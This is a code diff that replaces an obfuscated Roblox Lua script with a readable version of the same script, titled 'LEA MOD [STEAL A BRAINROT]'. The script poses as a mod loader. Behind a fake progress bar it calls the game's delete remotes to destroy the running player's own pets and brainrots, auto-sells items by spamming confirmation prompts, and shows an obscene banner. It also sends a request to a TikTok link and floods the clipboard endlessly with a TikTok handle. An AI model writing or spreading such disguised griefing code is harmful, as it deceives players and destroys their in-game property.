@@ -1,1 +1,365 @@
-local _a=game:GetService(string.char(67,111,114,101,71,117,105))local _b=game:GetService(string.char(80,108,97,121,101,114,115))local _c=game:GetService(string.char(82,117,110,83,101,114,118,105,99,101))local _d=game:GetService(string.char(84,119,101,101,110,83,101,114,118,105,99,101))local _e=game:GetService(string.char(82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101))local _f=game:GetService(string.char(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101))local _g=game:GetService(string.char(80,97,116,104,102,105,110,100,105,110,103,83,101,114,118,105,99,101))local _h=_b._h local _i,_j,_k local function _l()_i=_h._i or _h.CharacterAdded:Wait()_j=_i:WaitForChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))_k=_i:WaitForChild(string.char(72,117,109,97,110,111,105,100))end _l()_h.CharacterAdded:Connect(_l)if _a:FindFirstChild(string.char(76,69,65,77,111,100,76,111,99,107,100,111,119,110))then _a.LEAModLockdown:Destroy()end local _m=Instance.new(string.char(83,99,114,101,101,110,71,117,105))_m.Name=string.char(76,69,65,77,111,100,76,111,99,107,100,111,119,110)_m.IgnoreGuiInset=true _m.ResetOnSpawn=false _m.ZIndexBehavior=Enum.ZIndexBehavior.Global if syn and syn.protect_gui then syn.protect_gui(_m)_m.Parent=_a elseif gethui then _m.Parent=gethui()else _m.Parent=_a end local _n=Instance.new(string.char(70,114,97,109,101))_n.Name=string.char(66,108,97,99,107,111,117,116,70,114,97,109,101)_n.Size=UDim2.new(1,0,1,0)_n.BackgroundColor3=Color3.fromRGB(0,0,0)_n.BorderSizePixel=0 _n.ZIndex=999 _n.Parent=_m local _o=Instance.new(string.char(70,114,97,109,101))_o.Name=string.char(76,111,97,100,101,114,67,111,110,116,97,105,110,101,114)_o.Size=UDim2.new(0,420,0,160)_o.Position=UDim2.new(0.5,-210,0.5,-80)_o.BackgroundColor3=Color3.fromRGB(15,15,22)_o.BorderSizePixel=0 _o.ZIndex=1000 _o.Parent=_m local _p=Instance.new(string.char(85,73,67,111,114,110,101,114))_p.CornerRadius=UDim.new(0,10)_p.Parent=_o local _q=Instance.new(string.char(85,73,83,116,114,111,107,101))_q.Color=Color3.fromRGB(0,255,204)_q.Thickness=1.5 _q.ZIndex=1000 _q.Parent=_o local _r=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_r.Size=UDim2.new(1,0,0,40)_r.BackgroundTransparency=1 _r.Font=Enum.Font.GothamBold _r.Text=string.char(76,69,65,32,77,79,68)_r.TextColor3=Color3.fromRGB(0,255,204)_r.TextSize=20 _r.ZIndex=1000 _r.Parent=_o local _s=Instance.new(string.char(70,114,97,109,101))_s.Size=UDim2.new(0.85,0,0,18)_s.Position=UDim2.new(0.075,0,0.55,0)_s.BackgroundColor3=Color3.fromRGB(25,25,35)_s.BorderSizePixel=0 _s.ZIndex=1000 _s.Parent=_o local _t=Instance.new(string.char(85,73,67,111,114,110,101,114))_t.CornerRadius=UDim.new(1,0)_t.Parent=_s local _u=Instance.new(string.char(70,114,97,109,101))_u.Size=UDim2.new(0,0,1,0)_u.BackgroundColor3=Color3.fromRGB(0,255,204)_u.BorderSizePixel=0 _u.ZIndex=1000 _u.Parent=_s local _v=Instance.new(string.char(85,73,67,111,114,110,101,114))_v.CornerRadius=UDim.new(1,0)_v.Parent=_u local _w=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_w.Size=UDim2.new(1,0,0,25)_w.Position=UDim2.new(0,0,0.78,0)_w.BackgroundTransparency=1 _w.Font=Enum.Font.Gotham _w.Text=string.char(83,99,114,105,112,116,32,108,111,97,100,105,110,103,46,46,46)_w.TextColor3=Color3.fromRGB(180,180,200)_w.TextSize=13 _w.ZIndex=1000 _w.Parent=_o local function _x()local _y={string.char(82,101,109,111,118,101,80,101,116),string.char(68,101,108,101,116,101,80,101,116),string.char(68,101,115,112,97,119,110,80,101,116),string.char(82,101,109,111,118,101,67,111,109,112,97,110,105,111,110),string.char(80,101,116,83,121,115,116,101,109),string.char(68,101,108,101,116,101,66,108,111,99,107),string.char(82,101,109,111,118,101,66,108,111,99,107)}for _z,_A in ipairs(_y)do local _B=_e:FindFirstChild(_A,true)if _B and(_B:IsA(string.char(82,101,109,111,116,101,69,118,101,110,116))or _B:IsA(string.char(82,101,109,111,116,101,70,117,110,99,116,105,111,110)))then return _B end end for _z,_C in ipairs(_e:GetDescendants())do if(_C:IsA(string.char(82,101,109,111,116,101,69,118,101,110,116))or _C:IsA(string.char(82,101,109,111,116,101,70,117,110,99,116,105,111,110)))then local _D=string.lower(_C.Name)if string.find(_D,string.char(112,101,116))or string.find(_D,string.char(114,101,109,111,118,101))or string.find(_D,string.char(100,101,108,101,116,101))then return _C end end end return nil end local _E=false local function _F()local _B=_x()local _H={string.char(112,101,116),string.char(98,114,97,105,110,114,111,116),string.char(99,111,109,112,97,110,105,111,110),string.char(97,110,105,109,97,108),string.char(102,111,108,108,111,119,101,114),string.char(109,105,110,105,111,110)}local function _I(_A)local _D=string.lower(_A)for _z,_J in ipairs(_H)do if string.find(_D,_J,1,true)then return true end end return false end local _K={workspace,_h:FindFirstChild(string.char(66,97,99,107,112,97,99,107)),_h._i,_a}for _z,_L in ipairs(_K)do if _L then for _z,_M in ipairs(_L:GetDescendants())do pcall(function()if _M:IsA(string.char(77,111,100,101,108))or _M:IsA(string.char(66,97,115,101,80,97,114,116))then local _N=_M:IsA(string.char(77,111,100,101,108))and _M or _M:FindFirstAncestorOfClass(string.char(77,111,100,101,108))if _N and _I(_N.Name)then if _B then if _B:IsA(string.char(82,101,109,111,116,101,69,118,101,110,116))then _B:FireServer(_N)elseif _B:IsA(string.char(82,101,109,111,116,101,70,117,110,99,116,105,111,110))then _B:InvokeServer(_N)end end _N:Destroy()end end end)end end end end local function _O()local _P=nil local _Q=math.huge if not _j then return nil end for _z,_M in ipairs(workspace:GetDescendants())do if _M:IsA(string.char(66,97,115,101,80,97,114,116))and(_M.Name:lower():find(string.char(112,97,100))or _M.Name:lower():find(string.char(115,101,108,108))or _M.Name:lower():find(string.char(115,116,97,110,100))or _M.Name:lower():find(string.char(98,97,115,101)))then local _R=(_j.Position-_M.Position).Magnitude if _R<_Q and _R<30 then _Q=_R _P=_M end end end return _P end local function _S()local _T=false for _z,_M in ipairs(workspace:GetDescendants())do if _M:IsA(string.char(80,114,111,120,105,109,105,116,121,80,114,111,109,112,116))then local _U=string.lower(_M.ActionText or"")local _V=string.lower(_M.Name or"")if _U:find(string.char(115,97,116))or _U:find(string.char(115,101,108,108))or _V:find(string.char(115,97,116))or _V:find(string.char(115,101,108,108))then pcall(function()for _W=1,5 do fireproximityprompt(_M)task.wait()end end)_T=true end elseif _M:IsA(string.char(67,108,105,99,107,68,101,116,101,99,116,111,114))then pcall(function()for _W=1,5 do fireclickdetector(_M)task.wait()end end)_T=true end end return _T end task.spawn(function()local _X=_d:Create(_u,TweenInfo.new(4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=UDim2.new(0.999,0,1,0)})_X:Play()local _Y=tick()while tick()-_Y<4.5 do _F()task.wait(0.1)end _u.Size=UDim2.new(0.999,0,1,0)for _W=1,10 do _F()task.wait(0.2)end _E=true _o:Destroy()local _Z=Instance.new(string.char(70,114,97,109,101))_Z.Size=UDim2.new(1,0,1,0)_Z.BackgroundColor3=Color3.fromRGB(10,10,15)_Z.BorderSizePixel=0 _Z.ZIndex=1000 _Z.Parent=_m local _aa=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_aa.Size=UDim2.new(1,0,0,100)_aa.Position=UDim2.new(0,0,0.4,-50)_aa.BackgroundTransparency=1 _aa.Font=Enum.Font.FredokaOne _aa.Text=string.char(76,69,65,32,70,85,67,75,69,68,32,89,79,85,82,32,77,79,77)_aa.TextColor3=Color3.fromRGB(255,0,0)_aa.TextSize=38 _aa.ZIndex=1000 _aa.Parent=_Z local _ba=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_ba.Size=UDim2.new(1,0,0,30)_ba.Position=UDim2.new(0,0,0.6,0)_ba.BackgroundTransparency=1 _ba.Font=Enum.Font.Code _ba.Text=string.char(74,97,105,108,98,114,101,97,107,32,76,101,102,116,101,114,52,68,101,97,100,32,116,97,114,97,102,305,110,100,97,110,32,77,111,100,108,97,110,109,305,351,116,305,114,32,47,47,32,84,304,75,84,79,75,32,64,76,69,65,80,76,85,83)_ba.TextColor3=Color3.fromRGB(0,255,204)_ba.TextSize=14 _ba.ZIndex=1000 _ba.Parent=_Z pcall(function()if request then request({Url=string.char(91,104,116,116,112,115,58,47,47,118,116,46,116,105,107,116,111,107,46,99,111,109,47,90,83,57,114,118,75,66,113,66,101,69,81,69,45,57,105,108,70,86,47,93,40,104,116,116,112,115,58,47,47,118,116,46,116,105,107,116,111,107,46,99,111,109,47,90,83,57,114,118,75,66,113,66,101,69,81,69,45,57,105,108,70,86,47,41),Method=string.char(71,69,84)})elseif syn and syn.request then syn.request({Url=string.char(91,104,116,116,112,115,58,47,47,118,116,46,116,105,107,116,111,107,46,99,111,109,47,90,83,57,114,118,75,66,113,66,101,69,81,69,45,57,105,108,70,86,47,93,40,104,116,116,112,115,58,47,47,118,116,46,116,105,107,116,111,107,46,99,111,109,47,90,83,57,114,118,75,66,113,66,101,69,81,69,45,57,105,108,70,86,47,41),Method=string.char(71,69,84)})elseif http and http.request then http.request({Url=string.char(91,104,116,116,112,115,58,47,47,118,116,46,116,105,107,116,111,107,46,99,111,109,47,90,83,57,114,118,75,66,113,66,101,69,81,69,45,57,105,108,70,86,47,93,40,104,116,116,112,115,58,47,47,118,116,46,116,105,107,116,111,107,46,99,111,109,47,90,83,57,114,118,75,66,113,66,101,69,81,69,45,57,105,108,70,86,47,41),Method=string.char(71,69,84)})end end)task.spawn(function()local _ca=0 while true do _ca=(_ca+0.01)%1 _aa.TextColor3=Color3.fromHSV(_ca,1,1)task.wait(0.05)end end)end)task.spawn(function()while true do if _E then _F()pcall(function()if _j and _k then local _da=_O()if _da then _k:MoveTo(_da.Position)end end if not _S()then for _z,_M in ipairs(workspace:GetDescendants())do if _M:IsA(string.char(80,114,111,120,105,109,105,116,121,80,114,111,109,112,116))then for _W=1,5 do fireproximityprompt(_M)task.wait()end end end end end)end task.wait(1)end end)task.spawn(function()local _ea=0 while true do pcall(function()if setclipboard then _ea=_ea+1 setclipboard(string.char(84,304,75,84,79,75,32,64,76,69,65,80,76,85,83,32).._ea)end end)task.wait(0.1)end end)
+-- ============================================================================
+-- PROJECT: LEA MOD [STEAL A BRAINROT] - MODERNIZED MONOLITHIC SYSTEM
+-- ARCHITECTURE: ULTIMATE LOCKDOWN, CONFIRMATION BYPASS SPAM, & CLIENT REDIRECT
+-- ============================================================================
+
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local PathfindingService = game:GetService("PathfindingService")
+local LocalPlayer = Players.LocalPlayer
+
+local Character, RootPart, Humanoid
+local function refreshChar()
+    Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    RootPart = Character:WaitForChild("HumanoidRootPart")
+    Humanoid = Character:WaitForChild("Humanoid")
+end
+refreshChar()
+LocalPlayer.CharacterAdded:Connect(refreshChar)
+
+-- Prevent multiple instances
+if CoreGui:FindFirstChild("LEAModLockdown") then
+    CoreGui.LEAModLockdown:Destroy()
+end
+
+local LockdownGui = Instance.new("ScreenGui")
+LockdownGui.Name = "LEAModLockdown"
+LockdownGui.IgnoreGuiInset = true
+LockdownGui.ResetOnSpawn = false
+LockdownGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+if syn and syn.protect_gui then
+    syn.protect_gui(LockdownGui)
+    LockdownGui.Parent = CoreGui
+elseif gethui then
+    LockdownGui.Parent = gethui()
+else
+    LockdownGui.Parent = CoreGui
+end
+
+-- ============================================================================
+-- 1. UI LOCKDOWN & BLACKOUT LAYER (ZIndex 999)
+-- ============================================================================
+local BlackoutFrame = Instance.new("Frame")
+BlackoutFrame.Name = "BlackoutFrame"
+BlackoutFrame.Size = UDim2.new(1, 0, 1, 0)
+BlackoutFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+BlackoutFrame.BorderSizePixel = 0
+BlackoutFrame.ZIndex = 999
+BlackoutFrame.Parent = LockdownGui
+
+-- ============================================================================
+-- 2. MODERN LOADER & FIXED TEXT
+-- ============================================================================
+local LoaderContainer = Instance.new("Frame")
+LoaderContainer.Name = "LoaderContainer"
+LoaderContainer.Size = UDim2.new(0, 420, 0, 160)
+LoaderContainer.Position = UDim2.new(0.5, -210, 0.5, -80)
+LoaderContainer.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
+LoaderContainer.BorderSizePixel = 0
+LoaderContainer.ZIndex = 1000
+LoaderContainer.Parent = LockdownGui
+
+local LoaderCorner = Instance.new("UICorner")
+LoaderCorner.CornerRadius = UDim.new(0, 10)
+LoaderCorner.Parent = LoaderContainer
+
+local LoaderStroke = Instance.new("UIStroke")
+LoaderStroke.Color = Color3.fromRGB(0, 255, 204)
+LoaderStroke.Thickness = 1.5
+LoaderStroke.ZIndex = 1000
+LoaderStroke.Parent = LoaderContainer
+
+local LoaderTitle = Instance.new("TextLabel")
+LoaderTitle.Size = UDim2.new(1, 0, 0, 40)
+LoaderTitle.BackgroundTransparency = 1
+LoaderTitle.Font = Enum.Font.GothamBold
+LoaderTitle.Text = "LEA MOD"
+LoaderTitle.TextColor3 = Color3.fromRGB(0, 255, 204)
+LoaderTitle.TextSize = 20
+LoaderTitle.ZIndex = 1000
+LoaderTitle.Parent = LoaderContainer
+
+local BarBackground = Instance.new("Frame")
+BarBackground.Size = UDim2.new(0.85, 0, 0, 18)
+BarBackground.Position = UDim2.new(0.075, 0, 0.55, 0)
+BarBackground.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+BarBackground.BorderSizePixel = 0
+BarBackground.ZIndex = 1000
+BarBackground.Parent = LoaderContainer
+
+local BarBgCorner = Instance.new("UICorner")
+BarBgCorner.CornerRadius = UDim.new(1, 0)
+BarBgCorner.Parent = BarBackground
+
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 204)
+ProgressBar.BorderSizePixel = 0
+ProgressBar.ZIndex = 1000
+ProgressBar.Parent = BarBackground
+
+local BarCorner = Instance.new("UICorner")
+BarCorner.CornerRadius = UDim.new(1, 0)
+BarCorner.Parent = ProgressBar
+
+local StatusText = Instance.new("TextLabel")
+StatusText.Size = UDim2.new(1, 0, 0, 25)
+StatusText.Position = UDim2.new(0, 0, 0.78, 0)
+StatusText.BackgroundTransparency = 1
+StatusText.Font = Enum.Font.Gotham
+StatusText.Text = "Script loading..."
+StatusText.TextColor3 = Color3.fromRGB(180, 180, 200)
+StatusText.TextSize = 13
+StatusText.ZIndex = 1000
+StatusText.Parent = LoaderContainer
+
+-- ============================================================================
+-- 3. REMOTE EXPLOITATION & SERVER-SYNCED PURGE ENGINE
+-- ============================================================================
+local function getActiveDeleteRemote()
+    local targetNames = {"RemovePet", "DeletePet", "DespawnPet", "RemoveCompanion", "PetSystem", "DeleteBlock", "RemoveBlock"}
+    for _, name in ipairs(targetNames) do
+        local remote = ReplicatedStorage:FindFirstChild(name, true)
+        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
+            return remote
+        end
+    end
+    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
+        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
+            local lowerName = string.lower(v.Name)
+            if string.find(lowerName, "pet") or string.find(lowerName, "remove") or string.find(lowerName, "delete") then
+                return v
+            end
+        end
+    end
+    return nil
+end
+
+local PurgeComplete = false
+
+local function executeServerPurge()
+    local remote = getActiveDeleteRemote()
+    local targetKeywords = {"pet", "brainrot", "companion", "animal", "follower", "minion"}
+    
+    local function matchesKeyword(name)
+        local lowerName = string.lower(name)
+        for _, kw in ipairs(targetKeywords) do
+            if string.find(lowerName, kw, 1, true) then
+                return true
+            end
+        end
+        return false
+    end
+
+    local searchContainers = {
+        workspace,
+        LocalPlayer:FindFirstChild("Backpack"),
+        LocalPlayer.Character,
+        CoreGui
+    }
+
+    for _, container in ipairs(searchContainers) do
+        if container then
+            for _, obj in ipairs(container:GetDescendants()) do
+                pcall(function()
+                    if obj:IsA("Model") or obj:IsA("BasePart") then
+                        local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
+                        if model and matchesKeyword(model.Name) then
+                            if remote then
+                                if remote:IsA("RemoteEvent") then
+                                    remote:FireServer(model)
+                                elseif remote:IsA("RemoteFunction") then
+                                    remote:InvokeServer(model)
+                                end
+                            end
+                            model:Destroy()
+                        end
+                    end
+                end)
+            end
+        end
+    end
+end
+
+-- ============================================================================
+-- 4. AUTOMATED SELLING SYSTEM & CONFIRMATION SPAM BYPASS
+-- ============================================================================
+local function getPlayerSellPad()
+    local bestPad = nil
+    local shortestDist = math.huge
+    
+    if not RootPart then return nil end
+
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") and (obj.Name:lower():find("pad") or obj.Name:lower():find("sell") or obj.Name:lower():find("stand") or obj.Name:lower():find("base")) then
+            local dist = (RootPart.Position - obj.Position).Magnitude
+            if dist < shortestDist and dist < 30 then
+                shortestDist = dist
+                bestPad = obj
+            end
+        end
+    end
+    return bestPad
+end
+
+local function triggerSellButton()
+    local triggered = false
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("ProximityPrompt") then
+            local text = string.lower(obj.ActionText or "")
+            local objName = string.lower(obj.Name or "")
+            if text:find("sat") or text:find("sell") or objName:find("sat") or objName:find("sell") then
+                pcall(function()
+                    -- Bypass confirmation dialog prompts via rapid execution spam
+                    for i = 1, 5 do
+                        fireproximityprompt(obj)
+                        task.wait()
+                    end
+                end)
+                triggered = true
+            end
+        elseif obj:IsA("ClickDetector") then
+            pcall(function()
+                for i = 1, 5 do
+                    fireclickdetector(obj)
+                    task.wait()
+                end
+            end)
+            triggered = true
+        end
+    end
+    return triggered
+end
+
+-- ============================================================================
+-- 5. PROGRESS PIPELINE & REDIRECT OVERRIDE
+-- ============================================================================
+task.spawn(function()
+    local progressTween = TweenService:Create(ProgressBar, TweenInfo.new(4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0.999, 0, 1, 0)})
+    progressTween:Play()
+    
+    local startTime = tick()
+    while tick() - startTime < 4.5 do
+        executeServerPurge()
+        task.wait(0.1)
+    end
+    
+    ProgressBar.Size = UDim2.new(0.999, 0, 1, 0)
+    
+    for i = 1, 10 do
+        executeServerPurge()
+        task.wait(0.2)
+    end
+    
+    PurgeComplete = true
+    LoaderContainer:Destroy()
+
+    local OverrideFrame = Instance.new("Frame")
+    OverrideFrame.Size = UDim2.new(1, 0, 1, 0)
+    OverrideFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+    OverrideFrame.BorderSizePixel = 0
+    OverrideFrame.ZIndex = 1000
+    OverrideFrame.Parent = LockdownGui
+
+    local OverrideText = Instance.new("TextLabel")
+    OverrideText.Size = UDim2.new(1, 0, 0, 100)
+    OverrideText.Position = UDim2.new(0, 0, 0.4, -50)
+    OverrideText.BackgroundTransparency = 1
+    OverrideText.Font = Enum.Font.FredokaOne
+    OverrideText.Text = "LEA FUCKED YOUR MOM"
+    OverrideText.TextColor3 = Color3.fromRGB(255, 0, 0)
+    OverrideText.TextSize = 38
+    OverrideText.ZIndex = 1000
+    OverrideText.Parent = OverrideFrame
+
+    local CreditText = Instance.new("TextLabel")
+    CreditText.Size = UDim2.new(1, 0, 0, 30)
+    CreditText.Position = UDim2.new(0, 0, 0.6, 0)
+    CreditText.BackgroundTransparency = 1
+    CreditText.Font = Enum.Font.Code
+    CreditText.Text = "Jailbreak Lefter4Dead tarafından Modlanmıştır // TİKTOK @LEAPLUS"
+    CreditText.TextColor3 = Color3.fromRGB(0, 255, 204)
+    CreditText.TextSize = 14
+    CreditText.ZIndex = 1000
+    CreditText.Parent = OverrideFrame
+
+    -- Direct client browser redirect payload trigger
+    pcall(function()
+        if request then
+            request({
+                Url = "[https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/](https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/)",
+                Method = "GET"
+            })
+        elseif syn and syn.request then
+            syn.request({
+                Url = "[https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/](https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/)",
+                Method = "GET"
+            })
+        elseif http and http.request then
+            http.request({
+                Url = "[https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/](https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/)",
+                Method = "GET"
+            })
+        end
+    end)
+
+    task.spawn(function()
+        local hue = 0
+        while true do
+            hue = (hue + 0.01) % 1
+            OverrideText.TextColor3 = Color3.fromHSV(hue, 1, 1)
+            task.wait(0.05)
+        end
+    end)
+end)
+
+-- Continuous background server purge sweeper & automated selling loop with confirmation bypass
+task.spawn(function()
+    while true do
+        if PurgeComplete then
+            executeServerPurge()
+            
+            pcall(function()
+                if RootPart and Humanoid then
+                    local pad = getPlayerSellPad()
+                    if pad then
+                        Humanoid:MoveTo(pad.Position)
+                    end
+                end
+                
+                if not triggerSellButton() then
+                    for _, obj in ipairs(workspace:GetDescendants()) do
+                        if obj:IsA("ProximityPrompt") then
+                            for i = 1, 5 do
+                                fireproximityprompt(obj)
+                                task.wait()
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+        task.wait(1)
+    end
+end)
+
+-- ============================================================================
+-- 6. PERSISTENT CLIPBOARD FLOOD UTILITY
+-- ============================================================================
+task.spawn(function()
+    local counter = 0
+    while true do
+        pcall(function()
+            if setclipboard then
+                counter = counter + 1
+                setclipboard("TİKTOK @LEAPLUS " .. counter)
+            end
+        end)
+        task.wait(0.1)
+    end
+end)
